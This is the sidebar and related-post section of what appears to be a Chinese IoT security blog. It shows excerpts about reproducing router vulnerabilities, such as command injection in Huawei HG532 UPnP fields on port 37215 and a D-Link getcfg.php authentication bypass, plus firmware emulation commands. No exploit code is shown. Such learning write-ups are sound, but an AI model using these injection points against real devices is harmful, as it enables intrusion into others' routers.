href="/2025/07/12/CVE-2017-17215%20%E5%8D%8E%E4%B8%BAHG532%E8%B7%AF%E7%94%B1%E5%99%A8RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="CVE-2017-17215 华为HG532路由器RCE漏洞复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-12</div><div class="info-item-2">CVE-2017-17215 华为HG532路由器RCE漏洞复现</div></div><div class="info-2"><div class="info-item-1">漏洞描述CVE-2017-17215是CheckPoint团队披露的远程命令执行（RCE）漏洞，存在于华为HG532路由器中。该设备支持名为DeviceUpgrade的一种服务类型，可通过向/ctrlt/DeviceUpgrade_1的地址提交请求，来执行固件的升级操作。可通过向37215端口发送数据包，启用UPnP协议服务，并利用该漏洞，在NewStatusURL或NewDownloadURL标签中注入任意命令以执行。 漏洞披露:https://research.checkpoint.com/2017/good-zero-day-skiddie/ 附件下载:通过网盘分享的文件：HG532eV100R001C02B015_upgrade_main.bin链接: https://pan.baidu.com/s/1r9fkxyNBKFhvu0uDRKzElg?pwd=xidp 提取码: xidp 漏洞分析根据官方的漏洞报告，我们知道漏洞存在于/bin/upnp二进制文件按照官方报告中提到的 NewStatusURL 或 NewDownloadURL...</div></div></div></a><a class="pagination-related" href="/2025/06/13/D-Link%20%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/" title="D-Link 登录信息泄露（权限绕过）漏洞分析报告（CVE-2018-7034）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-13</div><div class="info-item-2">D-Link 登录信息泄露（权限绕过）漏洞分析报告（CVE-2018-7034）</div></div><div class="info-2"><div class="info-item-1">前言漏洞编号CVE-2018-7034，影响D-Link和TrendNet的一些老设备。 通过网盘分享的文件：TEW751DR_FW103B03.bin链接: https://pan.baidu.com/s/1g37sSUnZQDQjpg_ABuGULg?pwd=xidp 提取码: xidp 这里分析的是TrendNet TEW751的固件，此外D-Link的一些老设备，如DIR645，DIR815等也都受该漏洞影响。 基础工具配置复现环境 Ubuntu 24.04.2 LTS 基础工具配置可以参考这篇文章中的配置: DIR-815 栈溢出漏洞(CNVD-2013-11625)复现-先知社区 漏洞分析存在漏洞的地方为 /squashfs-root/htdocs/web/getcfg.php  这里通过 $AUTHORIZED_GROUP 变量判断用户权限而 $GETCFG_SVC = cut($_POST[&quot;SERVICES&quot;], $SERVICE_INDEX, &quot;,&quot;); 中，$GETCFG_SVC 是通过 POST 传入的...</div></div></div></a><a class="pagination-related" href="/2025/07/13/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="IOT入门--路由器命令执行漏洞"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-13</div><div class="info-item-2">IOT入门--路由器命令执行漏洞</div></div><div class="info-2"><div class="info-item-1">D-Link DI_8100命令执行漏洞复现所需工具Burp Suite​​-Linux下载BurpSuite v2024.10汉化无cmd框版（2024.11.03更新） - 吾爱破解 - 52pojie.cn 配置Burp Suite​​教程Burp Suite代理和火狐浏览器的设置(超详细)_burpsuite firefox-CSDN博客 固件下载地址:http://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DI-8100 漏洞分析使用binwalk对固件进行分解 1binwalk -Me DI_8100-16.07.26A1.trx   查看一下系统架构以及保护  下面使用FirmAE对固件进行仿真进入FirmAE工具文件夹下，使用 run.sh 来进行启动 1sudo ./run.sh -d dlink &lt;DI_8100-16.07.26A1.trx的路径&gt;   选择2进入终端，然后使用ps命令查看进程我们发现程序启动之后 jhttpd 这个服务就启动了，所以我们主要的程序就是这个 jhttpd...</div></div></div></a><a class="pagination-related" href="/2025/07/14/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/" title="qemu搭建ARM64环境"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-14</div><div class="info-item-2">qemu搭建ARM64环境</div></div><div class="info-2"><div class="info-item-1">所需前置准备创建磁盘文件并下载内核镜像、内存盘镜像文件 12345678qemu-img create -f qcow2 debian-3607-aarch64.qcow2 32Gwget http://ftp.au.debian.org/debian/dists/bullseye/main/installer-arm64/current/images/netboot/debian-installer/arm64/initrd.gzwget http://ftp.au.debian.org/debian/dists/bullseye/main/installer-arm64/current/images/netboot/debian-installer/arm64/linuxwget http://ftp.au.debian.org/debian/dists/bullseye/main/installer-arm64/current/images/netboot/mini.iso  上述命令执行完毕之后可以得到下面这几个文件 1debian-3607-aarch64.qcow2...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/Qhead.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">XiDP</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">21</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/XiDP0"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">So get away</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83%E5%8F%8A%E6%89%80%E9%9C%80%E5%B7%A5%E5%85%B7"><span class="toc-number">1.</span> <span class="toc-text">复现环境及所需工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞复现环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E5%B7%A5%E5%85%B7%E9%85%8D%E7%BD%AE"><span class="toc-number">1.2.</span> <span class="toc-text">基础工具配置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.</span> <span class="toc-text">漏洞基本介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E7%A6%BB%E5%9B%BA%E4%BB%B6"><span class="toc-number">3.</span> <span class="toc-text">分离固件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">漏洞点分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MIPS%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E5%92%8C%E5%B7%A5%E5%85%B7"><span class="toc-number">5.</span> <span class="toc-text">MIPS栈溢出的相关知识和工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0mips%E7%9A%84rop%E5%AF%BB%E6%89%BEgadget%E6%89%80%E9%9C%80%E7%9A%84%E5%B7%A5%E5%85%B7"><span class="toc-number">5.1.</span> <span class="toc-text">构造mips的rop寻找gadget所需的工具</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#mipsrop"><span class="toc-number">5.1.1.</span> <span class="toc-text">mipsrop</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ropper"><span class="toc-number">5.1.2.</span> <span class="toc-text">ropper</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MIPS%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">5.2.</span> <span class="toc-text">MIPS基础知识</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8qemu%E7%94%A8%E6%88%B7%E6%80%81%E6%A8%A1%E6%8B%9F"><span class="toc-number">6.</span> <span class="toc-text">使用qemu用户态模拟</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#step1-%E6%B5%8B%E9%87%8F%E5%81%8F%E7%A7%BB%E9%87%8F"><span class="toc-number">6.1.</span> <span class="toc-text">step1 测量偏移量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step2-%E8%AE%A1%E7%AE%97libc%E5%9F%BA%E5%9C%B0%E5%9D%80"><span class="toc-number">6.2.</span> <span class="toc-text">step2 计算libc基地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step3-%E7%BC%96%E5%86%99%E5%B9%B6%E8%BF%90%E8%A1%8Cexp"><span class="toc-number">6.3.</span> <span class="toc-text">step3 编写并运行exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8qemu%E7%B3%BB%E7%BB%9F%E6%80%81%E6%A8%A1%E6%8B%9F"><span class="toc-number">7.</span> <span class="toc-text">使用qemu系统态模拟</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#step1-%E4%B8%8B%E8%BD%BD%E5%AF%B9%E5%BA%94%E5%86%85%E6%A0%B8%E5%8F%8A%E9%95%9C%E5%83%8F"><span class="toc-number">7.1.</span> <span class="toc-text">step1 下载对应内核及镜像</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step2-%E5%88%9B%E5%BB%BA%E7%BD%91%E6%A1%A5"><span class="toc-number">7.2.</span> <span class="toc-text">step2 创建网桥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step3-%E9%85%8D%E7%BD%AEqemu%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE"><span class="toc-number">7.3.</span> <span class="toc-text">step3 配置qemu虚拟机网络设置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step4-%E5%BC%80%E5%90%AF%E7%8E%AF%E5%A2%83"><span class="toc-number">7.4.</span> <span class="toc-text">step4 开启环境</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/14/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/" title="qemu搭建ARM64环境">qemu搭建ARM64环境</a><time datetime="2025-07-13T16:00:00.000Z" title="发表于 2025-07-14 00:00:00">2025-07-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/13/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="IOT入门--路由器命令执行漏洞">IOT入门--路由器命令执行漏洞</a><time datetime="2025-07-12T16:00:00.000Z" title="发表于 2025-07-13 00:00:00">2025-07-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/12/CVE-2017-17215%20%E5%8D%8E%E4%B8%BAHG532%E8%B7%AF%E7%94%B1%E5%99%A8RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="CVE-2017-17215 华为HG532路由器RCE漏洞复现">CVE-2017-17215 华为HG532路由器RCE漏洞复现</a><time datetime="2025-07-11T16:00:00.000Z" title="发表于 2025-07-12 00:00:00">2025-07-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/14/DIR-815%20%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/" title="DIR-815 栈溢出漏洞(CNVD-2013-11625)复现">DIR-815 栈溢出漏洞(CNVD-2013-11625)复现</a><time datetime="2025-06-13T16:00:00.000Z" title="发表于 2025-06-14 00:00:00">2025-06-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/13/2025%20ISCC%20%E6%93%82%E5%8F%B0%E8%B5%9BPwn-wp(%E5%90%AB%E9%99%84%E4%BB%B6)/" title="2025 ISCC 擂台赛Pwn-wp(含附件)">2025 ISCC 擂台赛Pwn-wp(含附件)</a><time datetime="2025-06-12T16:00:00.000Z" title="发表于 2025-06-13 00:00:00">2025-06-13</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/yu2.png);"><div id="footer-wrap"><div class="footer_custom_text">Let yourself go</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="(。・＿・。)ﾉ你好呀，希望博客里面的内容可以帮助到你" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>